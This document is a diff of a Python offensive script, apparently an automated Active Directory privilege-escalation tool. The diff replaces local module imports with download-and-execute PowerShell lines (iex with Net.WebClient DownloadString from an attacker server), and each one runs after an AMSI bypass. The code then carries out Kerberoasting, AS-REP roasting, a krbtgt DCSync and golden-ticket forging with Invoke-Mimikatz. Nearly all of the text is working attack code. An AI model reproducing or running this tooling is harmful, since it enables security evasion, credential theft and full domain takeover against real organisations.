@@ -4,14 +4,15 @@ import time,os,sys
 
 #Starting with the hacking 
 def stepFOUR_PrivilegeEsc():
-    print(f"\n{ok} 4-Starting with check vulnerabilities to elevate privileges ...\n")
+    print(f"\n{ok} 3-Starting with check vulnerabilities to elevate privileges ...\n")
     print(f"{warning} A- Check Unquoted path services vulnerabilities...")
     checking=0
     while(checking==0):
         time.sleep(2)
         print(f"{ok} Bypassing AMSI Security...\n")
         bypass=configurazione()
-        command0=bypass + "; " + f"Import-Module {data}PowerUp.ps1" + "; "
+        command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerUp.ps1')" + "; "
+        #command0=bypass + "; " + f"Import-Module {data}PowerUpOb.ps1" + "; "
         command1=command0 + " Get-UnquotedService | select Path,ServiceName"
         try:
             value=powershell_commandLine(command1)
@@ -39,7 +40,7 @@ def stepFOUR_PrivilegeEsc():
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
-    command0=bypass + "; " + f"Import-Module {data}PowerUp.ps1" + "; "
+    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerUp.ps1')" + "; "
     command1=command0 + " Get-ModifiableServiceFile"
     try:
         value=powershell_commandLine(command1)
@@ -84,13 +85,13 @@ def stepFOUR_PrivilegeEsc():
             print(f"{error} DsrmAdminLogonBehaviour not present...")
     except Exception as e:
         print(f"{error} General error: {e}")
-
+    
     time.sleep(1)
     print(f"\n{warning} D- Check AS-REP Roasting on the domains...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
-    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
     command1=command0 + 'Get-DomainUser -PreauthNotRequired | select displayname,userprincipalname,useraccountcontrol '
     try:
         value=powershell_commandLine(command1)
@@ -111,11 +112,11 @@ def stepFOUR_PrivilegeEsc():
 
     time.sleep(1)
     
-    print(f"\n{warning} D- Check abuse Kerberoasting...")
+    print(f"\n{warning} E- Check abuse Kerberoasting...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
-    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
     command1=command0 + 'Get-NetUser -SPN | select serviceprincipalname '
     try:
         value=powershell_commandLine(command1)
@@ -136,7 +137,7 @@ def stepFOUR_PrivilegeEsc():
             print("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
             print(f"{ok} Second Way")
             bypass=configurazione()
-            command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+            command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
             command1=command0 + 'Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat '
             try:
                 value=powershell_commandLine(command1)
@@ -155,11 +156,11 @@ def stepFOUR_PrivilegeEsc():
 
     time.sleep(1)
 
-    print(f"\n{warning} E- Check SeBackupPrivilege to Windows PrivEsc...")
+    print(f"\n{warning} F- Check SeBackupPrivilege to Windows PrivEsc...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
-    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
     command1=command0 + 'Get-NetGroupMember -Name "Backup Operators"'
     try:
         value=powershell_commandLine(command1)
@@ -171,7 +172,6 @@ def stepFOUR_PrivilegeEsc():
         else:
             print(f"\n{ok} User in Backup Operators FOUND\n")
             time.sleep(2)
-            command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
             command1=command0 + 'Get-NetGroupMember -Name "Remote Management Users"'
             value=powershell_commandLine(command1)
             value=cleanstring(value)
@@ -194,11 +194,11 @@ def stepFOUR_PrivilegeEsc():
     except Exception as e:
         print(f"{error} General Error: {e}")
 
-    print(f"\n{warning} F- Get Golden Ticket using krbtgt...")
+    print(f"\n{warning} G- Get Golden Ticket using krbtgt...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
-    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
     command1=command0 + 'Get-NetGroupMember -Name "Domain Admins"'
     try:
         value=powershell_commandLine(command1)
@@ -220,7 +220,8 @@ def stepFOUR_PrivilegeEsc():
                         trovato=1
                         print(f"{ok} This account can get golden ticket")
                         time.sleep(1)
-                        value=powershell_commandLine(f"{mimikatz} 'lsadump::dcsync /domain:marvel.local /user:krbtgt ' 'exit'")
+                        mimikatz_final=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/Invoke-Mimikatz.ps1')" + "; Invoke-Mimidogz -Command '\"lsadump::dcsync /domain:marvel.local /user:krbtgt\"'"
+                        value=powershell_commandLine(mimikatz_final)
                         value=cleanstring(value)
                         print(value)
                         command22=command0 + " Get-DomainSID"
@@ -232,10 +233,12 @@ def stepFOUR_PrivilegeEsc():
                         value_list=value.split("\n")
                         domain=value_list[-1].split(":")[1].rstrip().strip()
                         ntlm=input(f"{warning} Insert NTLM HASH of krbtgt': ")
-                        value=powershell_commandLine(f"{mimikatz} 'kerberos::golden /domain:{domain} /sid:{domainSID} /rc4:{ntlm} /id:500 /user:{account} /ptt' 'exit'")
+                        commandMimikatz= bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/Invoke-Mimikatz.ps1')" + f"; Invoke-Mimidogz -Command '\"  kerberos::golden /domain:{domain} /sid:{domainSID} /rc4:{ntlm} /id:500 /user:{account} /ptt\"'"
+                        value=powershell_commandLine(commandMimikatz)
                         value=powershell_commandLine("klist")
                         value=cleanstring(value)
                         print(value)
+
             
             if(trovato==0):
                 print(f"{error} This account cannot get golden ticket")
@@ -246,7 +249,7 @@ def stepFOUR_PrivilegeEsc():
     sys.exit(0)
     print(f"{warning} Check if this domain user has access to a server where a domain admin is logged in...")
     print(f"{ok} Invoke-UserHunter take a few minutes to check all machines...")
-    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+    command0=bypass + "; " + f"Import-Module {data}PowerViewOb.ps1" + "; "
     command1=command0 + " Invoke-UserHunter -CheckAccess"
     value=powershell_commandLine(command1)
     value=cleanstring(value)
@@ -264,9 +267,6 @@ if __name__=="__main__":
     title()
     time.sleep(2)
     stepONE_setupPolicy()
-    time.sleep(1)
-    print("\n============================================================================\n")
-    stepTWO_Installing_tools()
     time.sleep(1)
     print("\n============================================================================\n")
     StepTHREE_Enumeration()
